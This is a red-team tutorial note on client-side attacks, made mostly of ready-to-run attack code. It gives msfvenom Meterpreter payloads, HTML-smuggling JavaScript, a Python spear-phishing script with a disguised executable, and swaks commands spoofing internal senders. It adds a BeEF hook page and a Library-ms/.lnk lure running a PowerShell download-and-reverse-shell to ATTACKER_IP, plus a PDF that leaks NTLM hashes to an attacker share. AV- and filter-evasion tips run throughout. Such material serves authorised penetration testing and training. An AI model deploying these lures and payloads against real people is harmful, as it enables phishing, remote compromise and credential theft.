---
title: Client-Side Attacks
draft: false
tags:
  - red-teaming
  - phishing
  - client-side
  - initial-access
  - windows
---

Client-side attacks target the users of a network rather than its infrastructure. Instead of exploiting a server directly, we deliver a payload to a user's workstation through social engineering — tricked into opening a document, clicking a link, or visiting a webpage. These attacks are especially effective when the network perimeter is well-hardened.

**Attack flow:** Recon → Resource Development → Weaponization → Delivery → Execution

**Sub-topics with dedicated notes:**
- [[Phishing with Microsoft Office]] — VBA macros, HTA, shellcode runners, MacroPack
- [[Phishing with Calendars]] — ICS calendar invite phishing
- [[Pretexting]] — social engineering lures and pretext design
- [[Command and Control (C2-C&C)]] — post-exploitation once initial access is obtained

---
# Information Gathering

## Enumerate Metadata from Public Documents

Publicly available documents (PDFs, Word files, Excel spreadsheets) often contain metadata revealing internal usernames, software versions, and creation tools — useful for pretexting and targeting.

Search for public documents:
```
site:TARGET_DOMAIN filetype:pdf
site:TARGET_DOMAIN filetype:docx
```

> [!Note]
> PDFs can also be downloaded from the official website (press releases, annual reports, job postings, etc.).

Extract metadata from downloaded files:
```bash
$ exiftool -a -u FILENAME.pdf

# -a: display duplicate tags
# -u: display unknown tags
# Look for: Author, Creator, CreatorTool, Company, LastModifiedBy, Producer
```

This can reveal:
- Internal employee names (author fields) → use for pretexting sender identity
- Software versions (Creator Tool) → identify exploitable software on the target
- Creation dates → understand document workflows

## Enumerate Victim OS and Browser

Use [Canarytokens](https://canarytokens.com/) to generate a tracking link. Send it to the target (via email, LinkedIn, etc.). When opened, you receive the victim's IP, browser, and OS — useful for building a targeted payload.

---
# Browser Fingerprinting Website

Set up a fingerprinting page to gather detailed system info from any visitor — useful before delivering a targeted payload.

1. Install Apache:
```sh
$ sudo apt-get install apache2
$ sudo systemctl start apache2
$ cd /var/www/html
```

2. Clone fingerprintjs2:
```sh
$ sudo git clone https://github.com/Valve/fingerprintjs2 fingerprintjs2
```

3. Navigate to `http://127.0.0.1/fingerprintjs2` — the page outputs all extracted system info.

4. Modify `index.html` to silently log the fingerprint to a file instead of displaying it (hide evidence, log multiple victims):
```sh
$ cd fingerprintjs2
$ vim index.html
```

5. Parse the collected User-Agent string at https://explore.whatismybrowser.com/useragents/parse/ to identify exact browser version and OS.

---
# Resource Development & Weaponization

**Resource development**: acquiring tools, knowledge, and infrastructure to build the attack (recon, C2 setup, payload generation). Output: tools and knowledge.

**Weaponization**: packaging the payload into a deliverable that will be sent to the target. For example, inserting a VBA macro into a Word document and crafting the email lure.

> [!Note]
> For VBA macro payloads (Word/Excel), HTA attacks, shellcode runners, and MacroPack automation, see [[Phishing with Microsoft Office]].

---
# File Smuggling with HTML and JavaScript

Deliver a payload directly through a webpage that auto-downloads an executable when the victim visits it. The executable is embedded as base64 inside the HTML, bypassing network-level file scanning since no external file is fetched.

1. Generate the payload:
```sh
$ msfvenom LHOST=LOCAL_HOST LPORT=LOCAL_PORT -p windows/meterpreter/reverse_tcp -f exe > backdoor.exe
```

2. Encode the payload as base64:
```sh
$ base64 -w0 backdoor.exe > base64.txt
```

3. Create the HTML delivery page (`/var/www/html/index.html`). Paste the base64 string into the `file` variable:
```html
<html>
	<body>
		<script>
			function base64ToArrayBuffer(base64) {
				var binary_string = window.atob(base64);
				var len = binary_string.length;
				var bytes = new Uint8Array(len);
				for (var i = 0; i < len; i++) {
					bytes[i] = binary_string.charCodeAt(i);
				}
				return bytes.buffer;
			}
			var file = '<backdoor.exe Base64 Encoded Value>';
			var data = base64ToArrayBuffer(file);
			var blob = new Blob([data], {type: 'octet/stream'});
			var fileName = 'update.exe';
			var a = document.createElement('a');
			document.body.appendChild(a);
			a.style = 'display: none';
			var url = window.URL.createObjectURL(blob);
			a.href = url;
			a.download = fileName;
			a.click();
			window.URL.revokeObjectURL(url);
		</script>
	</body>
</html>
```

4. Start Apache and the Meterpreter listener:
```sh
$ service apache2 start

msf> use multi/handler
msf> set payload windows/meterpreter/reverse_tcp
msf> set LHOST LOCAL_HOST
msf> set LPORT LOCAL_PORT
msf> run
```

5. Send the URL to the victim via phishing email. When they visit the page, the browser auto-downloads and saves the payload.

> [!Warning] OPSEC
> - The file is written to the victim's **Downloads** folder — AV will scan it on write. Use an encoded/obfuscated payload or a staged payload (`-f exe` with meterpreter stager) to reduce detection.
> - The filename (`update.exe`) should match the pretext — `Chrome_Update.exe`, `VPN_Client.exe`, etc.
> - This technique bypasses email attachment filters since only a URL is sent, not a file.

---
# Spear Phishing Attachment via SMTP

Send a malicious executable directly as an email attachment using Python's smtplib. Requires access to an SMTP server (compromised internal relay, or an external SMTP with auth).

1. Generate the payload:
```sh
$ msfvenom LHOST=LOCAL_HOST LPORT=LOCAL_PORT -p windows/meterpreter/reverse_tcp -f exe > backdoor.exe
```

2. Create the sending script (`email_send.py`):
```python
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

fromaddr = "attacker@fake.net"
toaddr = "target@company.com"

msg = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "Q3 Security Report - Action Required"

body = "Please find the attached security report for your review."
msg.attach(MIMEText(body, 'plain'))

filename = "SecurityReport_Q3.exe"           # convincing filename
attachment = open("/root/backdoor.exe", "rb")

p = MIMEBase('application', 'octet-stream')
p.set_payload(attachment.read())
encoders.encode_base64(p)
p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
msg.attach(p)

s = smtplib.SMTP('SMTP_SERVER', 25)          # target SMTP server
text = msg.as_string()
s.sendmail(fromaddr, toaddr, text)
s.quit()
```

3. Setup the listener:
```sh
msf> use multi/handler
msf> set LHOST LOCAL_HOST
msf> set LPORT LOCAL_PORT
msf> set payload windows/meterpreter/reverse_tcp
msf> run
```

4. Send the email:
```sh
$ python3 email_send.py
```

Alternatively, use **swaks** for a quicker send:
```bash
$ sudo swaks -t target@company.com --from hr@company.com \
  --attach @backdoor.exe --server SMTP_SERVER_IP \
  --body "Please review the attached document." \
  --header "Subject: Q3 Payroll Report"
```

> [!Warning] OPSEC
> - Sending an `.exe` attachment will be blocked by virtually all modern email gateways. Use a document payload ([[Phishing with Microsoft Office]]) or HTML smuggling instead.
> - For `.doc`/`.docx` payloads with swaks: `--attach @document.doc`

---
# Browser Exploitation with BeEF

BeEF (Browser Exploitation Framework) hooks victim browsers via a JavaScript snippet injected into a page the victim visits. Once hooked, BeEF provides a command interface to interact with the victim's browser — executing client-side attacks, extracting info, and delivering further payloads.

1. Start BeEF:
```sh
$ sudo beef-xss
```

Navigate to `http://127.0.0.1:3000/ui/panel` and login (`beef:beef` or configured password).

2. Create a malicious phishing page that loads the BeEF hook:
```html
<html>
	<head>
		<script src="http://ATTACKER_IP:3000/hook.js"></script>
	</head>
	<body>
		<h1>Please update your browser to access the website</h1>
	</body>
</html>
```

3. Host the page with Apache and send the URL to the victim:
```sh
$ service apache2 start
```

4. Once a victim visits the page, their browser appears in the BeEF panel under "Hooked Browsers".

5. From the BeEF interface → **Commands** tab → select **Fake Notification Bar**:
   - Set **Plugin URL** to a hosted Meterpreter payload
   - Set a convincing message (e.g., "Browser update required — click to install")

6. Generate and host the follow-up payload:
```sh
$ msfvenom LHOST=ATTACKER_IP LPORT=LOCAL_PORT -p windows/meterpreter/reverse_tcp -f exe > backdoor.exe
$ python3 -m http.server 8080

msf> use multi/handler
msf> set LHOST ATTACKER_IP
msf> set LPORT LOCAL_PORT
msf> set payload windows/meterpreter/reverse_tcp
msf> run
```

> [!Note]
> BeEF requires the victim to have JavaScript enabled and to stay on the hooked page. It's most effective against older or unpatched browsers. Modern browsers have significantly reduced the attack surface for client-side browser exploits.

---
# Windows Library Files Phishing

Windows Library Files (`.Library-ms`) point to a location — local folder or remote WebDAV share — that appears as a Windows Explorer folder. Sending this file as an attachment causes the victim's Explorer to connect to an attacker-controlled WebDAV share when they open it, displaying the share's contents as a normal folder. A `.lnk` shortcut inside the share executes the payload.

**Why it works:** `.Library-ms` files open automatically in Explorer without any macro security warnings. The victim just needs to open the attachment.

1. Create `config.Library-ms` (on a Windows host or Kali with the right template):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://ATTACKER_WEBDAV_HOST</url>    <!-- WebDAV server URL -->
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

2. Create the payload `.lnk` shortcut (`automatic_configuration.lnk`) that runs a PowerShell reverse shell when clicked:
```powershell
# Target field of the shortcut:
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP:LOCAL_PORT/powercat.ps1'); powercat -c ATTACKER_IP -p LISTENER_PORT -e powershell"
```

3. Setup the WebDAV server on the attack host:
```bash
$ pip3 install wsgidav --break-system-packages
# or: sudo apt install python3-wsgidav

$ mkdir /home/kali/webdav
$ cp automatic_configuration.lnk /home/kali/webdav/

$ /home/kali/.local/bin/wsgidav \
    --host=0.0.0.0 \
    --port=80 \
    --auth=anonymous \
    --root /home/kali/webdav/

# Parameters:
# --host=0.0.0.0    listen on all interfaces
# --port=80         port (must match the URL in the Library file)
# --auth=anonymous  no auth required (victim connects without prompting)
# --root=<DIR>      directory to serve as the WebDAV share
```

> [!Important]
> Don't start the WebDAV server until `config.Library-ms` and `automatic_configuration.lnk` are already in the webdav folder. Starting the server before causes metadata timestamp issues.

4. Start listeners:
```bash
$ python3 -m http.server LOCAL_PORT   # to serve powercat.ps1
$ nc -nvlp LISTENER_PORT              # to receive the reverse shell
```

5. Send the phishing email with the `.Library-ms` file:
```bash
$ sudo swaks \
    -t target@company.com \
    -t target2@company.com \
    --from helpdesk@company.com \
    --attach @config.Library-ms \
    --server SMTP_SERVER_IP \
    --body @body.txt \
    --header "Subject: Urgent: VPN Configuration Update" \
    --suppress-data -ap

# -ap: prompt for SMTP authentication password
# --suppress-data: don't echo the email body to stdout
# @config.Library-ms: @ prefix attaches the file (without @ it sends the string)
```

> [!Warning] OPSEC
> - `.Library-ms` files bypass Mark of the Web in many Windows configurations since they reference a WebDAV location rather than downloading a file.
> - The `.lnk` shortcut is still visible to the user — name it something convincing: `VPN_Setup.lnk`, `IT_Configuration.lnk`.
> - WebDAV traffic on port 80 blends in with normal HTTP. Port 445 (SMB share) is an alternative but more likely to be blocked at the perimeter.

---
# ODT/ODS Malicious Payloads (Automated)

Generate malicious OpenDocument spreadsheets/docs (LibreOffice format) with an embedded macro payload using the MMG-LO tool.

```bash
$ git clone https://github.com/0bfxgh0st/MMG-LO/
$ cd MMG-LO

# Generate ODS payload (spreadsheet)
$ python3 mmg-ods.py [windows|linux] ATTACKER_IP LPORT

# windows|linux = target OS architecture
```

Setup listener and send:
```bash
$ nc -nvlp LPORT

$ sudo swaks -t target@company.com --from sender@company.com \
    --attach @payload.ods \
    --server SMTP_SERVER_IP \
    --body "Please review the attached Q3 spreadsheet." \
    --header "Subject: Q3 Budget Review"
```

---
# File Upload Phishing (Hash Capture)

If a web application has a file upload feature where a user (or admin) will open the uploaded file (e.g., CV upload for a job application, document upload for review), we can upload a specially crafted file that causes the opener's machine to authenticate to our Responder instance — capturing their NTLMv2 hash.

1. Start Responder on your attack machine:
```sh
$ sudo responder -I INTERFACE       # e.g., tun0 for VPN
```

2. Craft the malicious file. The file contains a reference to a UNC path (`\\ATTACKER_IP\share\`) that Windows automatically tries to authenticate to when the file is opened.

**PDF payload** (forces UNC auth when rendered):
```
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /XObject << /Im0 5 0 R >> >> >>
endobj

4 0 obj
<< /Length 44 >>
stream
q
100 0 0 100 100 600 cm
/Im0 Do
Q
endstream
endobj

5 0 obj
<<
/Type /XObject
/Subtype /Image
/Width 1
/Height 1
/ColorSpace /DeviceRGB
/BitsPerComponent 8
/Filter /DCTDecode
/Length 0
/F (\\\\ATTACKER_IP\\share\\image.jpg)
>>
stream
endstream
endobj

xref
0 6
0000000000 65535 f
trailer
<< /Size 6 /Root 1 0 R >>
startxref
%%EOF
```

3. Upload the file via the web application.

4. When the backend user opens the file, their machine automatically attempts NTLM authentication to `\\ATTACKER_IP\share\` — Responder captures the NTLMv2 hash.

5. Crack the hash:
```bash
$ hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

> [!Note]
> `.docx` files with embedded images referencing UNC paths work on the same principle. Tools like [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) automate generating various file types (`.docx`, `.xlsx`, `.pdf`, `.url`, `.lnk`) that all trigger UNC auth.

---
# Related Notes
- [[Phishing with Microsoft Office]] — VBA macros, HTA attacks, shellcode runners, MacroPack
- [[Phishing with Calendars]] — ICS calendar phishing
- [[Pretexting]] — social engineering and lure design
- [[Command and Control (C2-C&C)]] — post-exploitation after getting a shell
- [[AV Evasion]] — payload obfuscation to bypass AV on delivery
